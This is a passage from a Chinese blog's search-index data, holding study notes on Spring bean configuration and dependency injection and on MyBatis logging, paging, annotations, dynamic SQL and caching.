str) &#123; this.str &#x3D; str; &#125; @Override public String toString() &#123; return &quot;Hello&#123;&quot; + &quot;str&#x3D;&#39;&quot; + str + &#39;\\&#39;&#39; + &#39;&#125;&#39;; &#125;&#125; 3.在resources目录下新建一个beans.xml，内容是 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt; &lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot;&gt; &lt;property name&#x3D;&quot;str&quot; value&#x3D;&quot;Spring&quot;&#x2F;&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; 解释一下bean标签。id就是变量名，class指定类，property中的name就是类里面的那个属性，value给它赋值。思想就是创建类对象并且赋值给hello，然后使用类里面的Setter方法给类里面的属性str赋值Spring。这部分代码相当于传统的 12Hello hello &#x3D; new Hello();hello.Setter(Spring); 通过Spring这种XML配置方式，将bean对象保存在IOC容器中，之后测试类就可以读取这个xml文件获取里面的bean对象并调用方法了。test类 12345678910111213import com.ggy.pojo.Hello;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class test &#123; public static void main(String[] args) &#123; &#x2F;&#x2F;下面这句读取xml文件是固定的，获取IOC容器上下文对象 ApplicationContext context &#x3D; new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); &#x2F;&#x2F;调用getBean获取对象 Hello hello &#x3D; (Hello) context.getBean(&quot;Hello&quot;); System.out.println(hello.toString()); &#125;&#125; 运行结果： 1Hello&#123;str&#x3D;&#39;Spring&#39;&#125; IOC创建对象方式1.默认使用无参构造函数来创建对象。 2.如果要使用有参构造函数，那么bean中也要配置好参数，有三种方式： 通过参数的位置索引方式初始化 123456&lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot;&gt; &lt;constructor-arg index&#x3D;&quot;0&quot; value&#x3D;&quot;1&quot;&gt; &#x2F;&#x2F;第一个参数&lt;&#x2F;bean&gt;&lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot;&gt; &lt;constructor-arg index&#x3D;&quot;1&quot; value&#x3D;&quot;2&quot;&gt; &#x2F;&#x2F;第二个参数&lt;&#x2F;bean&gt; 通过参数的类型初始化（不建议使用） 123&lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot;&gt; &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;1&quot;&gt;&lt;&#x2F;bean&gt; 参数类型是String则赋值为1，但是如果有多个参数类型都是String时就没办法了。 通过参数的名字进行初始化 123&lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot;&gt; &lt;constructor-arg name&#x3D;&quot;str&quot; value&#x3D;&quot;1&quot;&gt;&lt;&#x2F;bean&gt; 参数的名字是str，赋值1. 注意：读取XML文件内容时，beans中的所有bean对象都已经被初始化，之后只需要getBean获取相应ID的对象即可。 Spring配置别名beans.xml中使用别名 1234&lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot;&gt; &lt;property name&#x3D;&quot;str&quot; value&#x3D;&quot;Spring&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;alias name&#x3D;&quot;hello&quot; alias&#x3D;&quot;hello1&quot;&#x2F;&gt; 有一个hello对象，然后使用alias给它起一个别名hello1，之后测试类中使用getBean获取对象时，既可以用hello，也可以用hello1. 12Hello hello &#x3D; (Hello) context.getBean(&quot;hello&quot;);Hello hello1 &#x3D; (Hello) context.getBean(&quot;hello1&quot;); Bean的属性配置123&lt;bean id&#x3D;&quot;hello&quot; class&#x3D;&quot;com.ggy.pojo.Hello&quot; name&#x3D;&quot;hello2,h1 h3;h4&quot;&gt; &lt;property name&#x3D;&quot;str&quot; value&#x3D;&quot;Spring&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; id是对象名，class是对象类型，name也是别名而且比alias更好，因为它支持多个别名，可以使用逗号、空格或者分号来分割。property是class那个类中的属性，name是属性名，value是给它赋值。 import配置一般用于团队开发，将多个配置文件，导入合并成为一个。xml配置文件正规名字应该是：applicationContext.xml。 多个人开发，就有多个XML文件，比如beans1.xml, beans2.xml, beans.xml3，那么在applicationContext.xml中使用import（同一目录下） 123&lt;import resource&#x3D;&quot;beans1.xml&quot;&#x2F;&gt;&lt;import resource&#x3D;&quot;beans2.xml&quot;&#x2F;&gt;&lt;import resource&#x3D;&quot;beans3.xml&quot;&#x2F;&gt; 这样就合并在一块了，之后测试类中读取的就是这个总的文件 1ApplicationContext context &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); 依赖注入构造器注入前面的IOC创建对象方式中已经说过。 Set注入【重点】依赖：bean对象的创建依赖于容器 注入：bean对象中的所有属性的值，由容器来注入 环境搭建1.新建模块，结构如下 2.Address类中定义一个属性Address 12345678910111213package com.ggy.pojo;public class Address &#123; private String address; public String getaddress() &#123; return address; &#125; public void setAddress(String address) &#123; address &#x3D; address; &#125;&#125; 3.Student类中定义多种类型的属性，并生成Getter and Setter和toString函数 12345678910public class Student &#123; private String name; private Address address; private String[] books; private List&lt;String&gt; hobbys; private Map&lt;String, String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info;&#125; 4.beans.xml中针对不同类型进行不同的Set注入 注入首先是熟悉的String类型 123&lt;bean id&#x3D;&quot;student&quot; class&#x3D;&quot;com.ggy.pojo.Student&quot;&gt; &lt;property name&#x3D;&quot;name&quot; value&#x3D;&quot;ggy&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 测试类 1234567public class test &#123; public static void main(String[] args) &#123; ApplicationContext context &#x3D; new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); Student name &#x3D; (Student) context.getBean(&quot;student&quot;); System.out.println(name.toString()); &#125;&#125; 结果 1Student&#123;name&#x3D;&#39;ggy&#39;, address&#x3D;null, books&#x3D;null, hobbys&#x3D;null, card&#x3D;null, games&#x3D;null, wife&#x3D;&#39;null&#39;, info&#x3D;null&#125; 属性是其它Bean对象类型，使用ref 12345&lt;bean id&#x3D;&quot;address&quot; class&#x3D;&quot;com.ggy.pojo.Address&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;student&quot; class&#x3D;&quot;com.ggy.pojo.Student&quot;&gt; &lt;property name&#x3D;&quot;address&quot; ref&#x3D;&quot;address&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 属性是数组类型 1234567&lt;property name&#x3D;&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;1&lt;&#x2F;value&gt; &lt;value&gt;2&lt;&#x2F;value&gt; &lt;value&gt;3&lt;&#x2F;value&gt; &lt;&#x2F;array&gt;&lt;&#x2F;property&gt; 属性是List类型 1234567&lt;property name&#x3D;&quot;hobbys&quot;&gt; &lt;list&gt; &lt;value&gt;1&lt;&#x2F;value&gt; &lt;value&gt;2&lt;&#x2F;value&gt; &lt;value&gt;3&lt;&#x2F;value&gt; &lt;&#x2F;list&gt;&lt;&#x2F;property&gt; 属性是Map类型 123456&lt;property name&#x3D;&quot;card&quot;&gt; &lt;map&gt; &lt;entry key&#x3D;&quot;身份证&quot; value&#x3D;&quot;11xx&quot;&#x2F;&gt; &lt;entry key&#x3D;&quot;学号&quot; value&#x3D;&quot;1234&quot;&#x2F;&gt; &lt;&#x2F;map&gt;&lt;&#x2F;property&gt; 属性是Set集合类型 1234567&lt;property name&#x3D;&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;1&lt;&#x2F;value&gt; &lt;value&gt;2&lt;&#x2F;value&gt; &lt;value&gt;3&lt;&#x2F;value&gt; &lt;&#x2F;set&gt;&lt;&#x2F;property&gt; 属性是字符串类型，但是是空的字符串 1&lt;property name&#x3D;&quot;wife&quot; value&#x3D;&quot;&quot;&#x2F;&gt; 如果值要为null，则 123&lt;property name&#x3D;&quot;wife&quot;&gt; &lt;null&#x2F;&gt;&lt;&#x2F;property&gt; 属性是Properties类型 123456&lt;property name&#x3D;&quot;info&quot;&gt; &lt;props&gt; &lt;prop key&#x3D;&quot;sex&quot;&gt;男&lt;&#x2F;prop&gt; &lt;prop key&#x3D;&quot;生日&quot;&gt;2022.01.12&lt;&#x2F;prop&gt; &lt;&#x2F;props&gt;&lt;&#x2F;property&gt; 扩展注入P命名空间需要导入一个命名空间 1xmlns:p&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;p&quot; 即 12345678&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:p&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;p&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;&#x2F;beans&gt; 使用 1&lt;bean id&#x3D;&quot;student&quot; class&#x3D;&quot;com.ggy.pojo.Student&quot; p:name&#x3D;&quot;ggy&quot; p:address-ref&#x3D;&quot;address&quot;&#x2F;&gt; C命名空间增加一个C命名空间 1xmlns:c&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;c&quot; 这个是针对有参构造函数的，方便的给构造函数的参数进行赋值，不需要之前那样使用constructor-arg了。 使用 1&lt;bean id&#x3D;&quot;student&quot; class&#x3D;&quot;com.ggy.pojo.Student&quot; c:name&#x3D;&quot;ggy&quot; c:sex&#x3D;&quot;boy&quot;&#x2F;&gt; 有参构造函数的两个参数是name和sex。","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Spring5学习(1)","slug":"Spring5学习-1","permalink":"https://ggyggy666.github.io/tags/Spring5%E5%AD%A6%E4%B9%A0-1/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Mybatis学习3","slug":"Mybatis学习3","date":"2021-06-09T03:35:44.000Z","updated":"2021-06-10T14:11:01.511Z","comments":true,"path":"2021/06/09/Mybatis学习3/","link":"","permalink":"https://ggyggy666.github.io/2021/06/09/Mybatis%E5%AD%A6%E4%B9%A03/","excerpt":"今天继续学习Mybatis。","text":"今天继续学习Mybatis。 日志日志可以记录所做的操作，从而快速发现错误。 Mybatis中可以在Mybatis-config.xml中配置settings, 使用logImpl开启日志，日志也有多种 SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING | STDOUT_LOGGING | NO_LOGGING 其中，LOG4J和STDOUT_LOGGING需要掌握。 STDOUT_LOGGING标准输出日志。在mybatis-config.xml中 123&lt;settings&gt; &lt;setting name&#x3D;&quot;logImpl&quot; value&#x3D;&quot;STDOUT_LOGGING&quot;&#x2F;&gt;&lt;&#x2F;settings&gt; 注意，settings标签在properties标签后面。顺序！ 然后测试 可以看到输出的日志。 LOG4Japache的一个开源项目，可以控制日志输出的目的是控制台、文件还是GUI组件，也可以控制日志的输出形式，还可以控制日志信息的级别，决定生成的日志是否详细。更重要的是，可以通过一个配置文件灵活配置。 1.导入log4j的包 123456&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;log4j&#x2F;log4j --&gt;&lt;dependency&gt; &lt;groupId&gt;log4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;log4j&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.17&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 2.在resources目录下新建一个log4j.properties 123456789101112131415161718192021222324#将DEBUG级别的日志信息输出到控制台和文件log4j.rootLogger&#x3D;DEBUG,console,file#控制台输出的相关配置log4j.appender.console&#x3D;org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target &#x3D; System.outlog4j.appender.console.Threshold&#x3D;DEBUGlog4j.appender.console.layout &#x3D; org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern &#x3D; [%c]-%m%n#文件输出的相关配置log4j.appender.file &#x3D; org.apache.log4j.RollingFileAppenderlog4j.appender.file.File &#x3D; .&#x2F;log&#x2F;Mybatis.loglog4j.appender.file.MaxFileSize &#x3D; 10mblog4j.appender.file.Threshold &#x3D; DEBUGlog4j.appender.file.layout &#x3D;org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern &#x3D;[%p][%d&#123;yy-MM-dd&#125;][%c]%m%n#选择输出什么日志，日志输出级别log4j.logger.org.mybatis&#x3D;DEBUGlog4j.logger.java.sql&#x3D;DEBUGlog4j.logger.java.sql.Statement&#x3D;DEBUGlog4j.logger.java.sql.ResultSet&#x3D;DEBUGlog4j.logger.java.sql.PreparedStatement&#x3D;DEBUG 3.配置Log4J 123&lt;settings&gt; &lt;setting name&#x3D;&quot;logImpl&quot; value&#x3D;&quot;LOG4J&quot;&#x2F;&gt;&lt;&#x2F;settings&gt; 4.直接测试运行 log4j的使用 之前的日志都是系统自己运行生成的，log4j支持自定义的信息加入到日志中。 1.在测试类中导入Logger包，注意是需要org.apache.log4j的。 123456public void testLog4j()&#123; Logger logger &#x3D; Logger.getLogger(userMapperTest.class); logger.info(&quot;info: yes&quot;); logger.debug(&quot;debug: yes&quot;); logger.error(&quot;error: yes&quot;);&#125; 有3个方法，一般情况使用Info，debug模式使用debug，发生错误使用error。 userMapperTest.class表明这个日志记录这个类里面运行产生的日志信息。 2.在其它函数也能用，就得把getLogger放在类开头并使用static 1static Logger logger &#x3D; Logger.getLogger(userMapperTest.class); 然后在一个函数比如test函数中使用 12345678910@Testpublic void test()&#123; &#x2F;&#x2F;获取sqlSession对象 SqlSession session &#x3D; MybatisUtils.getSession(); userMapper usermapper &#x3D; session.getMapper(userMapper.class); user user &#x3D; usermapper.getUserById(1); logger.info(&quot;输出查询到的用户信息：&quot;); System.out.println(user); session.close();&#125; 运行后，查看日志 分页其实就是查询数据库，只不过SQL语句使用了Limit 12select * from mybatis.user limit startIndex, pageSizeselect * from mybatis.user limit 3;&#x2F;&#x2F;默认从0开始取3个 1.userMapper中 1List&lt;user&gt; getUserListByLimit(Map&lt;String, Integer&gt; map); 2.userMapper.xml中 1234567&lt;resultMap id&#x3D;&quot;map&quot; type&#x3D;&quot;com.ggy.pojo.user&quot;&gt; &lt;result column&#x3D;&quot;pwd&quot; property&#x3D;&quot;password&quot;&#x2F;&gt;&lt;&#x2F;resultMap&gt;&lt;select id&#x3D;&quot;getUserListByLimit&quot; resultMap&#x3D;&quot;map&quot;&gt; select * from mybatis.user limit #&#123;startIndex&#125;,#&#123;pageSize&#125;;&lt;&#x2F;select&gt; 3.userMapperTest中 12345678910111213@Testpublic void getUserListByLimit()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); HashMap&lt;String, Integer&gt; stringIntegerHashMap &#x3D; new HashMap&lt;String, Integer&gt;(); stringIntegerHashMap.put(&quot;startIndex&quot;, 0); stringIntegerHashMap.put(&quot;pageSize&quot;, 2); List&lt;user&gt; userListByLimit &#x3D; mapper.getUserListByLimit(stringIntegerHashMap); for(user u:userListByLimit)&#123; System.out.println(u); &#125; session.close();&#125; 注解开发注解开发记得mapper映射 不传参数不用userMapper.xml文件了，而是直接在接口上写注解的SQL语句。 新建一个项目后，将之前的东西都复制过来，然后把userMapper.xml删除。在Mybatis-config.xml中换一种mapper映射资源方式 123&lt;mappers&gt; &lt;mapper class&#x3D;&quot;com.ggy.dao.userMapper&quot;&#x2F;&gt;&lt;&#x2F;mappers&gt; 之后在userMapper中 1234public interface userMapper &#123; @Select(&quot;select * from mybatis.user;&quot;) List&lt;user&gt; getUserList();&#125; 然后在测试类中 12345678910@Testpublic void test()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); List&lt;user&gt; userList &#x3D; mapper.getUserList(); for(user u:userList)&#123; System.out.println(u); &#125; session.close();&#125; 输出的结果如下 可以发现，password为空了，这是因为user类中的password属性与数据库表中的字段pwd不一致，而且没有userMapper.xml做映射了，因此查询为null。 注解方式可以用于简单的执行SQL语句，复杂一点就不行了。 本质：反射机制 底层：动态代理 传参数（不是类）传的参数是int,String等，参数前都需要加@param(“xx”)，注意这个里面的xx与SQL语句中的#{xx}一致。 12@Select(&quot;select * from mybatis.user where id &#x3D; #&#123;id&#125;;&quot;)user getUserById(@Param(&quot;id&quot;) int id); 测试 12345678@Testpublic void testid()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); user userById &#x3D; mapper.getUserById(1); System.out.println(userById); session.close();&#125; 如果是删除、修改、插入操作需要提交事务，每次都提交麻烦，可以在工具类中使用openSession时配置自动提交。 123public static SqlSession getSession()&#123; return sqlSessionFactory.openSession(true);&#125; 传参数（类）如果传的参数是类，不需要@param注解 接口类中 12@Insert(&quot;insert into user(id,name,pwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;password&#125;);&quot;)int insertUser(user u); 测试 1234567@Testpublic void insertUser()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); int res &#x3D; mapper.insertUser(new user(7,&quot;ggy7&quot;,&quot;777&quot;)); session.close();&#125; 成功插入。 动态SQL动态SQL，就是在不同条件下生成不同的SQL语句。有四种 if choose(when, otherwise) trim(where, set) foreach 搭建环境1234567create table blog( id varchar(50) not null comment &#39;博客id&#39;, title varchar(50) not null comment &#39;博客标题&#39;, author varchar(30) not null comment &#39;博客作者&#39;, create_time datetime not null comment &#39;创建时间&#39;, views int(30) not null comment &#39;浏览量&#39;)engine&#x3D;InnoDB default charset&#x3D;utf8; 创建好表，新建一个项目。 将db.properties和Mybatis-config.xml复制到resources目录。 main的java目录下，创建一个com.ggy包，在这个包下创建dao, pojo, utils包。 将MybatisUtil.java类复制过来到utils包中。 在pojo包下新建一个Blog类，然后生成构造函数（有参和无参），Getter and Setter，还有toString函数。 12345private String id;private String title;private String author;private Date create_time;private int views; 在dao包下新建一个接口BlogMapper.java类和一个BlogMapper.xml文件。BlogMapper.xml先初始化 12345678&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;com.ggy.dao.BlogMapper&quot;&gt;&lt;&#x2F;mapper&gt; 然后在Mybatis-config.xml中更新mappers 123&lt;mappers&gt; &lt;mapper class&#x3D;&quot;com.ggy.dao.BlogMapper&quot;&#x2F;&gt;&lt;&#x2F;mappers&gt; 在utils包下新建一个IDutils类，因为ID不是从1开始递增了，而是使用UUID随机生成返回。 发现类名有下划线，不是红色，因此是警告，使用@SuppressWarnings(&quot;all&quot;)来抑制警告。 新建一个randomID函数，返回一个生成的UUID，将函数变成static，之后就可以直接用类名.函数名访问。 1234public static String randomID()&#123; String s &#x3D; UUID.randomUUID().toString(); return s;&#125; 测试 12345@Testpublic void getID()&#123; String s &#x3D; randomID(); System.out.println(s);&#125; 得到 1410f5378-b8ab-4afc-b566-4b40a072885c UUID去除掉-，则需要使用replace 1String s &#x3D; UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;); 在BlogMapper接口类中增加一个插入数据的接口 1int addBlog(Blog blog); BlogMapper.xml中 123&lt;insert id&#x3D;&quot;addBlog&quot; parameterType&#x3D;&quot;Blog&quot;&gt; insert into Mybatis.Blog(id, title, author, create_time, views) values (#&#123;id&#125;, #&#123;title&#125;, #&#123;author&#125;, #&#123;create_time&#125;, #&#123;views&#125;);&lt;&#x2F;insert&gt; 测试类 123456789101112131415161718192021@Testpublic void test()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); BlogMapper mapper &#x3D; session.getMapper(BlogMapper.class); Blog blog &#x3D; new Blog(); blog.setId(IDutils.randomID()); blog.setTitle(&quot;新青年&quot;); blog.setAuthor(&quot;ggy&quot;); blog.setCreate_time(new Date()); blog.setViews(1500); mapper.addBlog(blog); blog.setId(IDutils.randomID()); blog.setTitle(&quot;ccg-lenovo.com&quot;); blog.setAuthor(&quot;ggy&quot;); blog.setCreate_time(new Date()); blog.setViews(9900); mapper.addBlog(blog); session.close();&#125; 执行后，即可在数据库中成功插入两条数据。 IF如果满足if的条件（test=），则在SQL语句后增加一个条件。 BlogMapper.java中增加一个接口 1List&lt;Blog&gt; queryBlogIF(Map&lt;String, String&gt; map); BlogMapper.xml中实现 123456789&lt;select id&#x3D;&quot;queryBlogIF&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;Blog&quot;&gt; select * from Mybatis.blog where 1&#x3D;1 &lt;if test&#x3D;&quot;title!&#x3D;null&quot;&gt; and title&#x3D;#&#123;title&#125; &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;author!&#x3D;null&quot;&gt; and author&#x3D;#&#123;author&#125; &lt;&#x2F;if&gt;&lt;&#x2F;select&gt; SQL语句后增加了两个if标签，test=””是条件，如果条件满足，SQL语句后面就拼接上相应的条件。比如这里，title和author都是空时，将blog内容全都查出来，如果title不为空，增加一个条件：where title=#{title}, 如果author也不为空，又拼接一个SQL条件。 测试 12345678@Testpublic void query()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); BlogMapper mapper &#x3D; session.getMapper(BlogMapper.class); HashMap&lt;String, String&gt; map &#x3D; new HashMap&lt;String, String&gt;(); mapper.queryBlogIF(map); session.close();&#125; 全都查出来了。然后title不为空情况下 1map.put(&quot;title&quot;, &quot;新青年&quot;); 只查询出新青年这一条，author也不为空 12map.put(&quot;title&quot;, &quot;新青年&quot;);map.put(&quot;author&quot;, &quot;ggy&quot;); 两个条件都满足的也只有新青年这一条记录了。 trim(where, set)使用trim可以等价于where或者set。 等价于where 前置即增加WHERE，只满足一个条件时将前面的AND或者OR去掉。 123&lt;trim prefix&#x3D;&quot;WHERE&quot; prefixOverrides&#x3D;&quot;AND | OR&quot;&gt; ...&lt;&#x2F;trim&gt; 等价于set 前置即增加SET，只更改一个值时将后面的逗号去掉 123&lt;trim prefix&#x3D;&quot;SET&quot; suffixOverrides&#x3D;&quot;,&quot;&gt; ...&lt;&#x2F;trim&gt; where注意到上面的BlogMapper.xml中的SQL语句是用来where 1=1, 后面的if标签用了and xxx才能拼接成功。而如果把这where 1=1去掉，就应该使用where标签了 1234567891011&lt;select id&#x3D;&quot;queryBlogIF&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;Blog&quot;&gt; select * from Mybatis.blog &lt;where&gt; &lt;if test&#x3D;&quot;title!&#x3D;null&quot;&gt; title&#x3D;#&#123;title&#125; &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;author!&#x3D;null&quot;&gt; and author&#x3D;#&#123;author&#125; &lt;&#x2F;if&gt; &lt;&#x2F;where&gt;&lt;&#x2F;select&gt; 如果只满足第一个条件，SQL语句就是： 1select * from Mybatis.blog where title&#x3D;#&#123;title&#125; 如果只满足第二个条件，SQL语句就是： 1select * from Mybatis.blog where author&#x3D;#&#123;author&#125; 会自动把and去掉。如果两个条件都满足 1select * from Mybatis.blog where title&#x3D;#&#123;title&#125; and author&#x3D;#&#123;author&#125; setSET用于update语句，可以为SQL语句增加一个SET，如果只有一个要更改，可以去掉SQL语句中的逗号。 123456789101112&lt;select id&#x3D;&quot;queryBlogIF&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;Blog&quot;&gt; update Mybatis.blog &lt;set&gt; &lt;if test&#x3D;&quot;title!&#x3D;null&quot;&gt; title&#x3D;#&#123;title&#125;, &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;author!&#x3D;null&quot;&gt; author&#x3D;#&#123;author&#125; &lt;&#x2F;if&gt; &lt;&#x2F;set&gt; where id&#x3D;#&#123;id&#125;&lt;&#x2F;select&gt; choose when有IF了，那么就会有多个条件的，类似switch, Choose和when就是这样的东西。 12345678910111213141516&lt;select id&#x3D;&quot;queryBlogIF&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;Blog&quot;&gt; select * from Mybatis.blog &lt;where&gt; &lt;choose&gt; &lt;when test&#x3D;&quot;title!&#x3D;null&quot;&gt; title&#x3D;#&#123;title&#125; &lt;&#x2F;when&gt; &lt;when test&#x3D;&quot;author!&#x3D;null&quot;&gt; and author&#x3D;#&#123;author&#125; &lt;&#x2F;when&gt; &lt;otherwise&gt; and views&#x3D;#&#123;views&#125; &lt;&#x2F;otherwise&gt; &lt;&#x2F;choose&gt; &lt;&#x2F;where&gt;&lt;&#x2F;select&gt; 如果条件都满足，只用第一个就结束了。类似break。 SQL片段从上面可以知道，如果每一个功能都用到动态SQL，并且它们的IF语句都一样的话，就显得非常臃肿。因此需要采用SQL片段，将重复的条件放在SQL片段里面，然后用到时include即可。 首先将重复的IF语句放在sql标签里面，随便定义一个ID。 12345678&lt;sql id&#x3D;&quot;if-title-author&quot;&gt; &lt;if test&#x3D;&quot;title!&#x3D;null&quot;&gt; title&#x3D;#&#123;title&#125;, &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;author!&#x3D;null&quot;&gt; author&#x3D;#&#123;author&#125; &lt;&#x2F;if&gt;&lt;&#x2F;sql&gt; 然后使用include, refid是sql中的id。 1234567&lt;select id&#x3D;&quot;queryBlogIF&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;Blog&quot;&gt; update Mybatis.blog &lt;set&gt; &lt;include refid&#x3D;&quot;if-title-author&quot;&gt;&lt;&#x2F;include&gt; &lt;&#x2F;set&gt; where id&#x3D;#&#123;id&#125;&lt;&#x2F;select&gt; 注意，不要放太多语句在sql标签里面，也不要放where进去。 foreach适用于条件都在一个集合里面，比如In (1,2,3)。 SQL语句： 1select * from Mybatis.blog where id in(1,2) 首先新建一个接口 1List&lt;Blog&gt; queryBlogForEach(Map&lt;String, String&gt; map); 实现 12345678&lt;select id&#x3D;&quot;queryBlogForEach&quot; parameterType&#x3D;&quot;map&quot; resultType&#x3D;&quot;Blog&quot;&gt; select * from Mybatis.blog &lt;where&gt; &lt;foreach collection&#x3D;&quot;ids&quot; index&#x3D;&quot;index&quot; item&#x3D;&quot;id&quot; open&#x3D;&quot;id in (&quot; close&#x3D;&quot;)&quot; separator&#x3D;&quot;,&quot;&gt; #&#123;id&#125; &lt;&#x2F;foreach&gt; &lt;&#x2F;where&gt;&lt;&#x2F;select&gt; ids是map里面的一个键，而且这个ids对应的值本身是一个集合，collection=”ids”。 index=”index“，不用改 item=”id”, 表示集合里面的每一项值，之后用#{id}取出来 open=”id in (“ ，表示这个条件是以id in(开头的 close=”)”，以)结束 separator=”,”，以逗号为分隔符 最终效果：id in (1) 或者 id in (1,2,3)… 测试 12345678910111213@Testpublic void testFor()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); BlogMapper mapper &#x3D; session.getMapper(BlogMapper.class); HashMap map &#x3D; new HashMap(); ArrayList&lt;String&gt; ids &#x3D; new ArrayList&lt;String&gt;(); map.put(&quot;ids&quot;, ids); List&lt;Blog&gt; list &#x3D; mapper.queryBlogForEach(map); for(Blog blog:list)&#123; System.out.println(blog); &#125; session.close();&#125; 由于集合是空集，不满足任何条件，所以可以查出所有数据。往集合里面加1， 1234567891011121314@Testpublic void testFor()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); BlogMapper mapper &#x3D; session.getMapper(BlogMapper.class); HashMap map &#x3D; new HashMap(); ArrayList&lt;String&gt; ids &#x3D; new ArrayList&lt;String&gt;(); ids.add(&quot;1&quot;); &#x2F;&#x2F;这里加了一个id为1. map.put(&quot;ids&quot;, ids); List&lt;Blog&gt; list &#x3D; mapper.queryBlogForEach(map); for(Blog blog:list)&#123; System.out.println(blog); &#125; session.close();&#125; 可以看到预编译的SQL语句是 1select * from Mybatis.blog WHERE id in ( ? ) 之后传了一个1进去，即可查询出来。 Mybatis详细执行流程 Resources获取加载全局配置文件 实例化SqlSessionFactoryBuilder构造器 解析配置文件流XMLConfigBuilder Configuration所有的配置信息 SqlSessionFactory实例化 transaction事务管理器 创建executor执行器 创建sqlSession 实现CRUD，如果事务出现问题需要回滚，回到6中的事务管理器 查看是否执行SQL成功，不成功需要回滚则回到6中的事务管理器。 成功则提交事务。 关闭sqlSession。 Mybatis缓存缓存就是存储在内存中的数据，当用户经常查询某些数据时，每次查询都需要访问数据库，效率不高；而如果将经常用到的且不轻易改变的数据存在内存中，之后再次查询就可以直接获取，减少与数据库的交互次数，从而减少系统开销，提高效率。 分类一级缓存和二级缓存。 